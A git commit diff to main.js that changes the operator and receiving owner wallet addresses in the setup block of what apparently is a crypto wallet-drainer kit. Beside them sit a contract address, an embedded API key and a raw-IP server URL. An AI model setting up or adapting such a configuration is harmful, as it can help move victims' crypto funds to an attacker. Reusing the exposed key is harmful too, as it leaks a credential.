740f5a4e93a632fb63e119af6935cb7eb960c3fb
Daniel Otabor <danieldamianotabor@gmail.com>
2023-10-18 09:16:16 +0100

    Update main.js

--- main.js
+++ main.js
@@ -21,9 +21,9 @@ let w3 = new ethers.providers.JsonRpcProvider(RPC);
 
 // SET THESE START
 // --> its recommended to set operator-wallet = ownerAddress-wallet -> then you just need to have 1 wallet to handle
-operator = '0xE9313639D1d532daB3A11fFe568f9655a2ccD982' //  --> The address (0x) of the operator that conducts transactions, the privatekey of which lies on the server in the variable
+operator = '0x1972220b75C907AD4103D78D226592915A222163' //  --> The address (0x) of the operator that conducts transactions, the privatekey of which lies on the server in the variable
 contractSAFA = '0x829d26e91AcEaB3e914479AC9fA67ca80a08B1fc' // specify address contract your deploy
-ownerAddress = '0xE9313639D1d532daB3A11fFe568f9655a2ccD982' // specify address reciept --> MY ACC 10
+ownerAddress = '0x1972220b75C907AD4103D78D226592915A222163' // specify address reciept --> MY ACC 10
 const ZAPPER_KEY = 'd33110cf-f610-408b-8d11-990da7f544d3'  // specify your API key
 const BASE_URL = 'http://217.76.57.250:8000/api'; // specify the address to the configured server in format https://server.com/api
 // SET THESE END
